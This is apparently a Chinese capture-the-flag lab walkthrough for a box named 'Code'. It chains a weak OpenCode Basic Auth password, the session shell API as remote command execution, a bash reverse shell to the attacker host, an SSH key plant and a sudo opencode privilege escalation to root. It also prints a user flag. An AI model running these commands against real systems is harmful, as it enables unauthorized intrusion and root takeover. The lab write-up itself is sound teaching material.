# Code 靶机复盘：OpenCode API 到 sudo 提权

> 本文记录的是隔离环境中的授权靶机复盘。Basic Auth 口令测试、远程命令执行与提权验证均不可用于未授权系统。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | Code / Debian |
| 目标地址 | 192.168.134.65 |
| 攻击机 | 192.168.134.4 |
| Web 栈 | Apache 2.4.68（80）、OpenCode 1.18.7（4096） |
| 开放端口 | 22/tcp、80/tcp、4096/tcp |
| 最终路径 | 页面注释线索 → OpenCode Basic Auth → Session Shell API → SSH → sudo opencode serve → root |

![Nmap 全端口扫描结果](/content/code/image-01.png)

## 1. 攻击链概览

这台靶机的入口是暴露在 4096 端口的 OpenCode Web 服务。拿到弱口令后，Session Shell API 直接变成命令执行；提权则来自 `sudo` 免密运行同一个能执行任意命令的工具。

```text
端口扫描
  → 80 页面 HTML 注释指向 OpenCode 文档
  → 4096 Basic Auth：opencode / secret
  → /session + /shell API 命令执行（beehack）
  → 反弹 Shell / 写入 SSH 公钥
  → sudo -l：NOPASSWD /usr/local/bin/opencode
  → sudo opencode serve --port 4097（root、未设密码）
  → 本机调用 root 服务的 Shell API
  → root
```

## 2. 枚举：三个开放端口

```bash
nmap -sT -sV -sC -O -p- 192.168.134.65
```

| 端口 | 服务 | 备注 |
|------|------|------|
| 22/tcp | OpenSSH 10.0p2 | 后续写公钥后稳定登录 |
| 80/tcp | Apache 2.4.68 | 页面标题 Dino Game |
| 4096/tcp | HTTP + Basic Auth | OpenCode Web，realm 为 Secure Area |

80 端口打开是一个小恐龙游戏。F12 查看源码时，在 `<head>` 里发现注释：

```html
<!--https://opencode.ai/docs/zh-cn/web/-->
```

![页面源码中的 OpenCode 文档注释](/content/code/image-02.png)

这说明 4096 上的服务大概率就是 OpenCode Web。访问 `http://192.168.134.65:4096` 会弹出 Basic Auth。

![4096 端口要求 Basic Auth 登录](/content/code/image-03.png)

结合文档线索做授权口令验证后，得到：

```text
opencode / secret
```

登录成功，确认是 OpenCode 控制台。

![使用 opencode:secret 进入 OpenCode](/content/code/image-04.png)

## 3. 利用：OpenCode Session Shell API

先探活与建会话：

```bash
curl -s -u opencode:secret http://192.168.134.65:4096/global/health
# {"healthy":true,"version":"1.18.7"}

curl -s -X POST http://192.168.134.65:4096/session \
  -u opencode:secret -H "Content-Type: application/json" \
  -d '{"title":"recon"}'
```

会话会落在 `/home/beehack`。接着走 Shell 接口执行命令：

```bash
curl -s -X POST http://192.168.134.65:4096/session/<SESSION_ID>/shell \
  -u opencode:secret -H "Content-Type: application/json" \
  -d '{"command":"id","agent":"build"}'
```

返回显示当前身份为 `uid=1000(beehack)`。OpenCode 本身就是设计来执行 shell 的，因此这里等价于已认证 RCE。

![OpenCode API 命令执行思路](/content/code/image-05.png)

先弹一个交互 Shell：

```bash
# 攻击机
nc -lvnp 4444

# 通过 API 触发
curl -s -X POST http://192.168.134.65:4096/session/<SESSION_ID>/shell \
  -u opencode:secret -H "Content-Type: application/json" \
  -d '{"command":"bash -i >& /dev/tcp/192.168.134.4/4444 0>&1","agent":"build"}'
```

![通过 Shell API 触发反弹 Shell](/content/code/image-06.png)

在会话里读取 user flag，并把攻击机公钥写入 `~/.ssh/authorized_keys`，再用 SSH 拿稳定终端：

```bash
cat user.txt
# flag{user-4dcf0d38201a6a1e5867dc2e031c5c55}

echo "ssh-ed25519 AAAA... kali@code-box" >> ~/.ssh/authorized_keys
```

```bash
ssh -i id_ed25519 beehack@192.168.134.65
sudo -l
```

`sudo -l` 关键点：

```text
(ALL : ALL) NOPASSWD: /usr/local/bin/opencode
```

![写入公钥、SSH 登录并发现 sudo opencode](/content/code/image-07.png)

## 4. 提权：sudo OpenCode 再开一个 root 服务

`opencode` 能执行任意命令，又以 root 免密运行，等价于直接给 root shell。更稳妥的做法是：用 sudo 再起一个只监听本机的 OpenCode 服务，然后从 `beehack` 会话去打它的 API。

```bash
sudo /usr/local/bin/opencode serve --port 4097 --hostname 127.0.0.1
```

服务提示 `OPENCODE_SERVER_PASSWORD is not set; server is unsecured`，并监听 `http://127.0.0.1:4097`。

![sudo 启动未设密码的 root OpenCode 服务](/content/code/image-08.png)

若前台会占住终端，可放后台：

```bash
sudo nohup /usr/local/bin/opencode serve --port 4097 --hostname 127.0.0.1 \
  >/tmp/oc-root.log 2>&1 &
```

再从本机创建会话并执行命令：

```bash
SID=$(curl -s -X POST http://127.0.0.1:4097/session \
  -H "Content-Type: application/json" \
  -d '{"title":"privesc"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['id'])")

curl -s -X POST http://127.0.0.1:4097/session/$SID/shell \
  -H "Content-Type: application/json" \
  -d '{"command":"id && whoami","agent":"build"}' \
  | python3 -c "import sys,json;d=json.load(sys.stdin);[print(p.get('state',{}).get('output','')) for p in d.get('parts',[]) if p.get('type')=='tool']"
```

输出：

```text
uid=0(root) gid=0(root) groups=0(root)
root
```

![通过本机 root OpenCode API 执行 id](/content/code/image-09.png)

![确认 root 权限与最终结果](/content/code/image-10.png)

> 防守视角：给 AI/Agent 类工具免密 sudo，本质上就是给了 root 命令执行。即使绑在本机回环，低权限用户仍可复用同一套 API。

## 5. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| 页面注释 | 源码注释经常直接指向真实服务与文档 |
| OpenCode Web | Basic Auth 后的 Session Shell API 就是命令执行面 |
| 稳定 Shell | API RCE 后优先写 SSH 公钥，比一直靠反弹更省事 |
| sudo 二进制 | 不要只看“能不能提权”，要看这个程序本身会不会执行命令 |
| 本机再服务 | `sudo opencode serve` 未设密码时，等于再暴露一个 root API |

## 6. 复盘

Code 的主线很新，但逻辑不绕：注释把人引到 OpenCode，弱口令进 API，API 给 user，sudo 再给同一个工具的 root 实例。真正值得记住的是——当 sudo 信任的对象本身就是“命令执行平台”时，提权往往不需要传统漏洞，只需要再调用一次它的能力。
